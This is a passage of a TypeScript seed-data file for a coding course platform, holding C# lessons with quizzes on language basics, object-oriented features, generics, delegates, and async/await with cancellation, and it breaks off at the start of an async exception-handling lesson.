5. Wrap the whole thing in a reusable \`<Spinner />\` component that accepts a \`size\` prop and works at any size.

## Stretch goals

- Add a second, independent ring rotating in the opposite direction at a different speed.
- Fade the spinner in with \`runTiming\` on an opacity value when it first mounts.
- Turn it into a progress ring: accept a \`progress\` prop (0-1) and animate the stroke's arc length to match instead of spinning forever.

Submit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const csharpLessons: SeedLesson[] = [
  {
    title: 'Hello, C#',
    content: lessonContent(
      'Hello, C#',
      `C# (pronounced "C sharp") is a statically-typed, object-oriented language built by Microsoft for the .NET platform. It's used for everything from web APIs (ASP.NET) to desktop apps to game development (Unity).\n\n\`\`\`csharp\nusing System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine("Hello, Kodstigen!");\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`using System;\` imports the namespace that contains \`Console\` and other common types.\n- Every C# program needs an entry point method called \`Main\`, that's where execution starts.\n- \`Console.WriteLine(...)\` prints a line of text to the terminal.\n\nCompile and run a C# project with the .NET CLI:\n\n\`\`\`bash\ndotnet run\n\`\`\``
    ),
    quiz: {
      title: 'C# Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the entry point method of a C# program called?',
          options: ['Start', 'Main', 'Run', 'Init'],
          answer: 'Main',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Console.____("Hello!") prints a line of text to the console.',
          options: [],
          answer: 'WriteLine',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'C# is a statically-typed language.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `\`\`\`csharp\nint xp = 100;\nstring name = "Ada";\nbool isInstructor = true;\ndouble score = 92.5;\n\nConsole.WriteLine($"{name} has {xp} XP");\n\`\`\`\n\n## Common types\n\n| Type | Example |\n|------|---------|\n| \`int\` | \`42\` |\n| \`double\` | \`3.14\` |\n| \`string\` | \`"hello"\` |\n| \`bool\` | \`true\` / \`false\` |\n\n## String interpolation\n\nA \`$"..."\` string lets you embed expressions directly with \`{ }\`, this is called **string interpolation**.\n\n## Type inference with \`var\`\n\n\`\`\`csharp\nvar count = 10; // the compiler infers count is an int\n\`\`\`\n\n\`var\` doesn't make C# dynamically typed, the compiler still figures out and locks in a concrete type at compile time, it just saves you from writing it out.`
    ),
    quiz: {
      title: 'Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which keyword lets the compiler infer a variable's type from its initial value?",
          options: ['auto', 'var', 'let', 'dynamic'],
          answer: 'var',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Embedding expressions directly in a string with $"{name}" is called string ____.',
          options: [],
          answer: 'interpolation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Once a variable is declared as an int, you can later assign a string to it without casting or conversion.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `\`\`\`csharp\nint xp = 45;\n\nif (xp >= 50)\n{\n    Console.WriteLine("Level up!");\n}\nelse\n{\n    Console.WriteLine($"Keep going, {50 - xp} XP to go.");\n}\n\nfor (int i = 1; i <= 5; i++)\n{\n    Console.WriteLine($"Lesson {i}");\n}\n\nforeach (var lang in new[] { "C#", "Python", "JavaScript" })\n{\n    Console.WriteLine(lang);\n}\n\`\`\`\n\n## The pieces\n\n- \`if\` / \`else\` branch on a boolean condition.\n- \`for (init; condition; increment)\` is best when you know how many times to loop.\n- \`foreach (var item in collection)\` visits every element of an array or collection without needing an index, use it whenever you don't need the index itself.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which loop is the best fit for visiting every element of a collection without needing an index?',
          options: ['for', 'foreach', 'while', 'do-while'],
          answer: 'foreach',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A for loop has three parts separated by semicolons: initializer, condition, and ____.',
          options: [],
          answer: 'increment',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An if statement in C# requires its condition to evaluate to a boolean.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Methods and Classes',
    content: lessonContent(
      'Methods and Classes',
      `A **class** bundles data (fields) and behavior (methods) together, it's the blueprint for creating objects.\n\n\`\`\`csharp\nclass Student\n{\n    public string Name;\n    public int Xp;\n\n    public Student(string name, int xp = 0)\n    {\n        Name = name;\n        Xp = xp;\n    }\n\n    public int GainXp(int amount)\n    {\n        Xp += amount;\n        return Xp;\n    }\n}\n\nvar ada = new Student("Ada");\nada.GainXp(50);\nConsole.WriteLine($"{ada.Name} has {ada.Xp} XP");\n\`\`\`\n\n## Key pieces\n\n- The method with the same name as the class (\`Student(string name, int xp = 0)\`) is the **constructor**, it runs when you create a new instance.\n- \`new Student("Ada")\` allocates a new object and runs its constructor.\n- \`public\` fields and methods are accessible from outside the class, by convention C# method and property names use PascalCase (\`GainXp\`, not \`gainXp\`).`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the method that runs automatically when you create a new instance of a class called?',
          options: ['The destructor', 'The constructor', 'The initializer', 'The allocator'],
          answer: 'The constructor',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ keyword allocates a new instance of a class and runs its constructor.',
          options: [],
          answer: 'new',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By convention, C# method names use PascalCase, like GainXp rather than gainXp.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Collections and LINQ',
    content: lessonContent(
      'Collections and LINQ',
      `\`\`\`csharp\nusing System.Linq;\n\nList<int> scores = new List<int> { 80, 92, 67, 100 };\n\nvar passed = scores.Where(s => s >= 70).ToList();\nvar doubled = scores.Select(s => s * 2).ToList();\nint total = scores.Sum();\n\nConsole.WriteLine($"passed: {string.Join(", ", passed)}");\nConsole.WriteLine($"total: {total}");\n\`\`\`\n\n## Collections\n\n\`List<T>\` is a resizable, generic collection, the \`<int>\` says it only holds \`int\`s.\n\n## LINQ\n\n**LINQ** (Language Integrated Query) adds query-style methods to collections, similar to JavaScript's \`map\`/\`filter\`/\`reduce\`:\n\n| LINQ | JavaScript equivalent |\n|------|------------------------|\n| \`Where(predicate)\` | \`filter\` |\n| \`Select(transform)\` | \`map\` |\n| \`Sum()\` | \`reduce\` (adding) |\n\nLINQ methods live in the \`System.Linq\` namespace, and (like the JavaScript array methods they resemble) return a new sequence rather than modifying the original.`
    ),
    quiz: {
      title: 'Collections & LINQ Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which LINQ method keeps only the elements that match a condition?',
          options: ['Select', 'Where', 'Sum', 'ToList'],
          answer: 'Where',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A resizable, generic collection of integers is declared as List<____>.',
          options: [],
          answer: 'int',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'LINQ methods like Where and Select modify the original collection in place.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Console Grade Book',
    content: lessonContent(
      'Final Project: Console Grade Book',
      `Time to combine classes, collections, and LINQ into a real console application.\n\n## Requirements\n\n1. Create a \`Student\` class with a name and a list of scores.\n2. Store several students in a \`List<Student>\`.\n3. Write a method that computes a student's average score.\n4. Use LINQ (\`Where\`, \`Select\`, or similar) to filter and report which students are passing (e.g. average \`>= 70\`).\n5. Loop over every student and print a report line with their name, average, and a letter grade (A/B/C/D/F) based on thresholds you define.\n\n## Stretch goals\n\n- Read student data from \`Console.ReadLine()\` instead of hardcoding it.\n- Sort students by average score, highest first.\n- Wrap score parsing in a \`try/catch\` to handle invalid input gracefully.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const csharpIntermediateLessons: SeedLesson[] = [
  {
    title: 'Inheritance and Polymorphism',
    content: lessonContent(
      'Inheritance and Polymorphism',
      `**Inheritance** lets one class reuse and extend another's members. A **derived class** inherits fields and methods from a **base class**, and can override its behavior.\n\n\`\`\`csharp\nclass Animal\n{\n    public string Name;\n\n    public Animal(string name) => Name = name;\n\n    public virtual string Speak() => $"{Name} makes a sound.";\n}\n\nclass Dog : Animal\n{\n    public Dog(string name) : base(name) { }\n\n    public override string Speak() => $"{Name} barks.";\n}\n\nAnimal a = new Dog("Rex");\nConsole.WriteLine(a.Speak()); // "Rex barks."\n\`\`\`\n\n## The pieces\n\n- \`class Dog : Animal\` means \`Dog\` inherits from \`Animal\`.\n- \`: base(name)\` calls the base class's constructor.\n- \`virtual\` on a base method marks it as overridable, \`override\` on the derived method replaces it.\n- **Polymorphism**: even though \`a\` is declared as \`Animal\`, calling \`Speak()\` runs \`Dog\`'s version, because the actual object at runtime is a \`Dog\`. That's why the last line prints "Rex barks." and not "Rex makes a sound."\n\n## sealed and base member access\n\n- \`sealed override\` prevents classes that inherit from \`Dog\` from overriding \`Speak()\` any further.\n- Inside an overriding method, \`base.Speak()\` calls the base class's original implementation.`
    ),
    quiz: {
      title: 'Inheritance & Polymorphism Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which keyword lets a derived class replace a base class's virtual method?",
          options: ['new', 'override', 'virtual', 'sealed'],
          answer: 'override',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A method marked ____ in the base class can be replaced by a derived class using override.',
          options: [],
          answer: 'virtual',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In C#, a class can inherit from more than one base class.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Interfaces and Abstract Classes',
    content: lessonContent(
      'Interfaces and Abstract Classes',
      `Two ways to define a contract that other classes must implement, with different tradeoffs.\n\n\`\`\`csharp\ninterface IDamageable\n{\n    void TakeDamage(int amount);\n}\n\nabstract class Character\n{\n    public int Health = 100;\n\n    public abstract void Attack(); // no body, must be implemented\n\n    public void Heal(int amount) => Health += amount; // shared behavior\n}\n\nclass Player : Character, IDamageable\n{\n    public override void Attack() => Console.WriteLine("Player attacks!");\n    public void TakeDamage(int amount) => Health -= amount;\n}\n\`\`\`\n\n## Interfaces\n\n- An \`interface\` declares members with no implementation, any class or struct that implements it must provide one.\n- A class can implement **multiple** interfaces (C# only allows single inheritance from a base class, but unlimited interfaces).\n- Interfaces describe *what* a type can do (\`IDamageable\`, \`IComparable\`), regardless of what it *is*.\n\n## Abstract classes\n\n- An \`abstract class\` can mix fully-implemented members (\`Heal\`) with \`abstract\` members that force derived classes to implement them (\`Attack\`).\n- You cannot create an instance of an abstract class directly (\`new Character()\` is an error), only of a concrete subclass.\n- A class can inherit from only **one** base class (abstract or not), but implement any number of interfaces.\n\n## When to use which\n\n| | Interface | Abstract class |\n|---|---|---|\n| Shared implementation? | No | Yes |\n| Multiple per class? | Yes | No, only one base class |\n| Use for | "can do" contracts | "is a" shared foundation |`
    ),
    quiz: {
      title: 'Interfaces & Abstract Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many interfaces can a single class implement?',
          options: ['Zero', 'Exactly one', 'Any number', 'Two at most'],
          answer: 'Any number',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'You cannot create an instance of an ____ class directly, only of a concrete subclass.',
          options: [],
          answer: 'abstract',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An interface can declare instance fields (variables) directly.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Generics',
    content: lessonContent(
      'Generics',
      `A **generic** type or method works with any type, decided when it's used, without giving up type safety or duplicating code.\n\n\`\`\`csharp\nclass Stack<T>\n{\n    private List<T> items = new List<T>();\n\n    public void Push(T item) => items.Add(item);\n\n    public T Pop()\n    {\n        T last = items[^1];\n        items.RemoveAt(items.Count - 1);\n        return last;\n    }\n}\n\nvar numbers = new Stack<int>();\nnumbers.Push(5);\nnumbers.Push(10);\nConsole.WriteLine(numbers.Pop()); // 10\n\nvar names = new Stack<string>();\nnames.Push("Ada");\n\`\`\`\n\n## The pieces\n\n- \`<T>\` is a **type parameter**, a placeholder that gets filled in with a real type (\`int\`, \`string\`, ...) when the class or method is used.\n- \`Stack<int>\` and \`Stack<string>\` are both backed by the same \`Stack<T>\` code, but the compiler enforces that a \`Stack<int>\` only ever holds \`int\`s.\n- Generic **methods** work the same way: \`T Max<T>(T a, T b) where T : IComparable<T>\`.\n- \`where T : SomeConstraint\` restricts what \`T\` can be, e.g. \`where T : class\` (reference types only) or \`where T : IDamageable\`.\n\n## Why not just use object?\n\nA non-generic collection typed as \`object\` would compile but let you push mismatched types, and would need a cast (with a runtime risk) every time you read a value out. Generics catch that mistake at compile time instead.`
    ),
    quiz: {
      title: 'Generics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does <T> represent in a generic class like Stack<T>?',
          options: ['A namespace', 'A type parameter filled in when the type is used', 'A base class', 'An interface'],
          answer: 'A type parameter filled in when the type is used',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A clause like where T : IComparable<T> is called a type ____.',
          options: [],
          answer: 'constraint',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Generics catch type mismatches at compile time instead of at runtime.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Exception Handling',
    content: lessonContent(
      'Exception Handling',
      `Things go wrong at runtime: a file is missing, a network call times out, a user types letters into a number field. **Exceptions** let you handle that without crashing the whole program.\n\n\`\`\`csharp\ntry\n{\n    int[] scores = { 90, 85, 77 };\n    Console.WriteLine(scores[5]); // out of range\n}\ncatch (IndexOutOfRangeException ex)\n{\n    Console.WriteLine($"Invalid index: {ex.Message}");\n}\nfinally\n{\n    Console.WriteLine("Always runs, whether or not an exception happened.");\n}\n\`\`\`\n\n## The pieces\n\n- \`try\` wraps code that might throw.\n- \`catch (SomeException ex)\` runs if that exception type (or a subclass of it) is thrown inside the \`try\` block, you can stack multiple \`catch\` blocks for different exception types.\n- \`finally\` runs no matter what, whether the \`try\` succeeded, threw, or the catch itself re-threw, use it for cleanup (closing a file, releasing a resource).\n- \`throw\` raises an exception yourself: \`throw new ArgumentException("amount must be positive");\`.\n\n## Custom exceptions\n\n\`\`\`csharp\nclass InsufficientXpException : Exception\n{\n    public InsufficientXpException(string message) : base(message) { }\n}\n\nif (xp < required)\n    throw new InsufficientXpException($"Need {required} XP, only have {xp}.");\n\`\`\`\n\nA custom exception inherits from \`Exception\` (or a more specific built-in one) and gives calling code something precise to catch, instead of catching the broad, generic \`Exception\`.`
    ),
    quiz: {
      title: 'Exception Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which block always runs, whether or not an exception was thrown?',
          options: ['try', 'catch', 'finally', 'throw'],
          answer: 'finally',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ keyword raises an exception yourself.',
          options: [],
          answer: 'throw',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A custom exception class typically inherits from Exception.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Delegates and Events',
    content: lessonContent(
      'Delegates and Events',
      `A **delegate** is a type-safe reference to a method, it lets you pass a method around like a value, store it in a variable, and call it later.\n\n\`\`\`csharp\ndelegate void Notify(string message);\n\nclass Alarm\n{\n    public event Notify OnTriggered;\n\n    public void Trigger()\n    {\n        Console.WriteLine("Alarm triggered!");\n        OnTriggered?.Invoke("Intruder detected");\n    }\n}\n\nclass Program\n{\n    static void Main()\n    {\n        var alarm = new Alarm();\n        alarm.OnTriggered += message => Console.WriteLine($"Security notified: {message}");\n        alarm.OnTriggered += message => Console.WriteLine($"Logged: {message}");\n\n        alarm.Trigger();\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`delegate void Notify(string message);\` declares a delegate type, any method matching that signature (\`void\`, one \`string\` parameter) can be assigned to it.\n- \`event Notify OnTriggered;\` exposes a delegate as an **event**, code outside \`Alarm\` can subscribe (\`+=\`) or unsubscribe (\`-=\`), but can't invoke it directly or overwrite other subscribers, only \`Alarm\` itself can call \`Invoke\`.\n- \`?.Invoke(...)\` safely calls every subscribed method, and does nothing if nobody has subscribed yet (\`OnTriggered\` would be \`null\`).\n- Multiple methods can subscribe to the same event, they all run, in the order they were added, when it's invoked.\n\n## Why events instead of calling methods directly?\n\nEvents **decouple** the class raising them from whoever reacts to them: \`Alarm\` doesn't need to know that a security system or a logger exists, it just announces "something happened," and anything that cares can subscribe.`
    ),
    quiz: {
      title: 'Delegates & Events Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the event keyword restrict, compared to a plain public delegate field?',
          options: [
            'Nothing, they are identical',
            'Outside code can subscribe or unsubscribe, but not invoke it directly',
            'Only one method can ever subscribe',
            'It can only be used with strings',
          ],
          answer: 'Outside code can subscribe or unsubscribe, but not invoke it directly',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Subscribing to an event uses the ____ operator, unsubscribing uses -=.',
          options: [],
          answer: '+=',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Multiple methods can subscribe to the same event.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Lambda Expressions, Func & Action',
    content: lessonContent(
      'Lambda Expressions, Func & Action',
      `A **lambda expression** is a compact, inline way to write a method, most useful when you need to pass a small piece of behavior somewhere, like a callback or a LINQ predicate.\n\n\`\`\`csharp\nFunc<int, int, int> add = (a, b) => a + b;\nConsole.WriteLine(add(3, 4)); // 7\n\nAction<string> log = message => Console.WriteLine($"[LOG] {message}");\nlog("Server started");\n\nList<int> scores = new List<int> { 55, 82, 91, 40 };\nList<int> passing = scores.Where(s => s >= 70).ToList();\n\`\`\`\n\n## Func and Action\n\n- \`Func<T1, ..., TResult>\` is a built-in delegate type for a method that **returns** a value, the last type parameter is always the return type. \`Func<int, int, int>\` takes two \`int\`s and returns an \`int\`.\n- \`Action<T1, ...>\` is the same idea for a method that returns **nothing** (\`void\`). \`Action<string>\` takes one \`string\` and returns nothing, plain \`Action\` takes no parameters at all.\n- Both are just delegate types the .NET library already defines, so you don't need your own \`delegate\` declaration for common shapes.\n\n## Lambda syntax\n\n- \`(a, b) => a + b\` is shorthand for a method taking \`a\` and \`b\`, and returning \`a + b\`.\n- A single parameter can drop the parentheses: \`s => s >= 70\`.\n- A lambda can capture variables from its surrounding scope (a **closure**), a lambda defined inside a method can still use that method's local variables even after being passed elsewhere.`
    ),
    quiz: {
      title: 'Lambdas, Func & Action Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which built-in delegate type represents a method that returns void?',
          options: ['Func', 'Action', 'Predicate', 'Delegate'],
          answer: 'Action',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In Func<int, int, int>, the ____ type parameter is always the return type.',
          options: [],
          answer: 'last',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A lambda expression can capture and use variables from its surrounding scope.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Event-Driven Inventory System',
    content: lessonContent(
      'Final Project: Event-Driven Inventory System',
      `Combine interfaces, generics, and events into one small system.\n\n## Requirements\n\n1. Define an \`IItem\` interface with at least a \`Name\` and a \`Value\` property.\n2. Create a generic \`Inventory<T> where T : IItem\` class that can \`Add(T item)\` and \`Remove(T item)\`, backed by a \`List<T>\`.\n3. Add an \`event Action<T> OnItemAdded\` (or a custom delegate) on \`Inventory<T>\` that fires whenever an item is added.\n4. Subscribe to \`OnItemAdded\` from outside the class to print a message like \`"Added: {item.Name} ({item.Value} gold)"\`.\n5. Wrap any invalid operation (e.g. removing an item that isn't in the inventory) in a **custom exception** and handle it with \`try/catch\` where the inventory is used.\n6. Create at least two classes implementing \`IItem\` (e.g. \`Weapon\`, \`Potion\`) and add instances of both to the same \`Inventory<IItem>\`.\n\n## Stretch goals\n\n- Add a \`TotalValue\` property using LINQ's \`Sum\`.\n- Add an \`OnItemRemoved\` event too.\n- Make \`Inventory<T>\` implement \`IEnumerable<T>\` so it can be used directly in a \`foreach\` loop.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const csharpAsyncLessons: SeedLesson[] = [
  {
    title: 'Introduction to Asynchronous Programming',
    content: lessonContent(
      'Introduction to Asynchronous Programming',
      `Some operations, reading a file, calling a web API, querying a database, take real time to complete, and don't need the CPU while they wait. **Asynchronous** code lets your program keep doing other work during that wait, instead of blocking a thread that's doing nothing but sitting idle.\n\n\`\`\`csharp\nusing System;\nusing System.Net.Http;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        Console.WriteLine("Starting download...");\n        string content = await DownloadAsync("https://example.com");\n        Console.WriteLine($"Downloaded {content.Length} characters");\n    }\n\n    static async Task<string> DownloadAsync(string url)\n    {\n        using var client = new HttpClient();\n        return await client.GetStringAsync(url);\n    }\n}\n\`\`\`\n\n## Synchronous vs asynchronous\n\n- **Synchronous** code blocks: calling \`GetStringAsync\` the old-fashioned, blocking way would leave the thread sitting frozen, doing nothing, until the network response arrives.\n- **Asynchronous** code frees the thread during the wait, \`await\` pauses this method (without blocking the thread) until the operation completes, then resumes exactly where it left off.\n- A \`Task\` represents work that's in progress, possibly not finished yet. \`Task<T>\` is the same idea but the work eventually produces a value of type \`T\`, like \`DownloadAsync\` returning \`Task<string>\`.\n\n## Why it matters\n\nIn a desktop or mobile app, blocking the main thread freezes the UI, buttons stop responding, the window stops redrawing. On a server, one thread blocked waiting on a database call is one fewer thread available to handle other requests. Async code avoids both problems by giving the thread back while waiting.`
    ),
    quiz: {
      title: 'Async Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does await do to the method it is used in?',
          options: [
            'Blocks the calling thread until the operation finishes',
            'Pauses the method without blocking the thread, resuming when the operation completes',
            'Immediately cancels the operation',
            'Runs the method on a new process',
          ],
          answer: 'Pauses the method without blocking the thread, resuming when the operation completes',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____<T> represents asynchronous work that will eventually produce a value of type T.',
          options: [],
          answer: 'Task',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Blocking the main thread in a desktop app can freeze the UI.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'async and await',
    content: lessonContent(
      'async and await',
      `The \`async\` and \`await\` keywords are what actually let you write asynchronous code that reads like ordinary, top-to-bottom synchronous code.\n\n\`\`\`csharp\nusing System;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        int result = await AddAsync(3, 4);\n        Console.WriteLine(result); // 7\n    }\n\n    static async Task<int> AddAsync(int a, int b)\n    {\n        await Task.Delay(1000); // simulate work\n        return a + b;\n    }\n}\n\`\`\`\n\n## The rules\n\n- \`async\` marks a method as containing \`await\` expressions, it doesn't make the method run on a background thread by itself, it just enables the \`await\` keyword inside it.\n- An \`async\` method's return type is almost always \`Task\`, \`Task<T>\`, or (rarely, for event handlers only) \`void\`. Never write \`async void\` for a regular method, exceptions thrown inside it can't be caught by the caller.\n- \`await\` can only be used inside a method marked \`async\`, it unwraps a \`Task<T>\` into its \`T\` result (or just waits for a plain \`Task\` to finish), and lets other work happen on the thread while waiting.\n- \`Task.Delay(1000)\` asynchronously waits about a second without blocking the thread, unlike \`Thread.Sleep(1000)\`, which does block it.\n\n## What "async all the way" means\n\nOnce one method needs to \`await\` something, every method that calls it should usually become \`async\` too, and its callers \`await\` it. Calling \`.Result\` or \`.Wait()\` on a \`Task\` to force synchronous behavior defeats the purpose and can even deadlock in UI applications, prefer \`await\` end to end.`
    ),
    quiz: {
      title: 'async/await Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does marking a method async actually do?',
          options: [
            'Runs it on a background thread automatically',
            'Enables the use of await inside that method',
            'Makes it run faster',
            'Prevents it from throwing exceptions',
          ],
          answer: 'Enables the use of await inside that method',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Task.____(1000) asynchronously waits about a second without blocking the thread, unlike Thread.Sleep.',
          options: [],
          answer: 'Delay',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling .Result on a Task instead of awaiting it can cause a deadlock in some applications.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Task.WhenAll and Task.WhenAny',
    content: lessonContent(
      'Task.WhenAll and Task.WhenAny',
      `Awaiting several operations one after another wastes the whole point of async, if they don't depend on each other, start them all at once.\n\n\`\`\`csharp\nusing System;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        Task<string> t1 = DownloadAsync("https://example.com/a");\n        Task<string> t2 = DownloadAsync("https://example.com/b");\n        Task<string> t3 = DownloadAsync("https://example.com/c");\n\n        string[] results = await Task.WhenAll(t1, t2, t3);\n        Console.WriteLine($"Got {results.Length} pages");\n    }\n\n    static async Task<string> DownloadAsync(string url)\n    {\n        using var client = new System.Net.Http.HttpClient();\n        return await client.GetStringAsync(url);\n    }\n}\n\`\`\`\n\n## The pieces\n\n- Calling \`DownloadAsync(...)\` without \`await\` **starts** the task immediately and returns a \`Task<string>\` you can hold onto, the download runs in the background right away.\n- \`await Task.WhenAll(t1, t2, t3)\` waits for all three to finish, and (for \`Task<T>\`) returns an array of their results in the same order they were passed in, even if they finish in a different order.\n- Awaiting each one individually, \`await t1; await t2; await t3;\`, would run them one after another instead of concurrently, three times slower for three independent, equally-long downloads.\n- \`Task.WhenAny(...)\` instead resolves as soon as the **first** task finishes, useful for a timeout pattern: race the real operation against \`Task.Delay(timeout)\` and see which finishes first.\n\n## When not to do this\n\nIf one operation depends on another's result, keep them sequential with separate \`await\`s, \`Task.WhenAll\` is for genuinely independent work, forcing dependent operations to run "concurrently" just creates bugs.`
    ),
    quiz: {
      title: 'WhenAll & WhenAny Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does Task.WhenAll(t1, t2, t3) do?',
          options: [
            'Runs the tasks one after another',
            'Cancels all three tasks',
            'Waits for all three tasks to complete, running them concurrently',
            'Returns as soon as the first task finishes',
          ],
          answer: 'Waits for all three tasks to complete, running them concurrently',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Task.____ resolves as soon as the first of several tasks finishes, useful for timeout patterns.',
          options: [],
          answer: 'WhenAny',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling an async method without awaiting it immediately starts the work in the background.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Cancellation with CancellationToken',
    content: lessonContent(
      'Cancellation with CancellationToken',
      `Long-running async work should be cancellable, a user closes a dialog, navigates away, or a timeout expires. \`CancellationToken\` is the standard way to signal that.\n\n\`\`\`csharp\nusing System;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        using var cts = new CancellationTokenSource();\n        cts.CancelAfter(TimeSpan.FromSeconds(3));\n\n        try\n        {\n            await CountAsync(cts.Token);\n        }\n        catch (OperationCanceledException)\n        {\n            Console.WriteLine("Cancelled!");\n        }\n    }\n\n    static async Task CountAsync(CancellationToken token)\n    {\n        for (int i = 1; i <= 10; i++)\n        {\n            token.ThrowIfCancellationRequested();\n            Console.WriteLine(i);\n            await Task.Delay(1000, token);\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`CancellationTokenSource\` is the object that can **trigger** cancellation, \`cts.Cancel()\` cancels immediately, \`cts.CancelAfter(...)\` schedules it.\n- \`CancellationToken\` (from \`cts.Token\`) is the read-only signal you pass down into async methods, they check it, they can't cancel anything themselves.\n- \`token.ThrowIfCancellationRequested()\` throws an \`OperationCanceledException\` if cancellation was requested, stopping the method's work at a clean point instead of continuing pointlessly.\n- Passing the token into \`Task.Delay(1000, token)\` lets the delay itself respond to cancellation immediately, instead of finishing its full second first.\n\n## Convention\n\nAny async method that might run for a while should accept an optional \`CancellationToken token = default\` parameter and pass it through to everything it awaits, this makes cancellation flow all the way down a chain of async calls instead of only stopping the top-level one.`
    ),
    quiz: {
      title: 'Cancellation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is responsible for actually triggering a cancellation?',
          options: ['CancellationToken', 'CancellationTokenSource', 'Task.Delay', 'OperationCanceledException'],
          answer: 'CancellationTokenSource',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'token.____() throws an OperationCanceledException if cancellation has been requested.',
          options: [],
          answer: 'ThrowIfCancellationRequested',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A CancellationToken can itself cancel work, without needing a CancellationTokenSource.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Exception Handling in Async Code',
    content: lessonContent(
      'Exception Handling in Async Code',
